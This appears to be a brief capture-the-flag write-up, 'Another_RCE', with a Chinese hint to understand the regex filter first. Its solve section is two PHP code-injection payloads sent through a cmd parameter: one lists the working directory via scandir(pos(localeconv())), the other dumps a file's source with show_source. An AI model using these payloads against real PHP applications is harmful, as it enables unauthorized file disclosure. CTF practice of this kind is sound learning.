## Another_RCE

---

建议先弄明白正则含义

> by CoHyu

### Solve

cmd=print_r(scandir(pos(localeconv())));

cmd=print_r(show_source(end(array_reverse(scandir(pos(localeconv()))))));
